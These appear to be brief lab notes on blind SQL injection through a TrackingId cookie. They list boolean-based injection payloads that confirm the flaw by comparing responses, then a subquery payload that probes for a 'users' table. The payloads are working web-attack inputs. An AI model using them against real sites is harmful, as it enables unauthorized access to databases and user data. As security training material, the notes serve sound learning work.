**Modify the CheckingID cookie to confirm the vulnerability**
*TrackingId=xyz' AND '1'='1* and *TrackingId=xyz' AND '1'='2* to see if there is a different respone
**Confirming that there is a table called *users***
*TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a*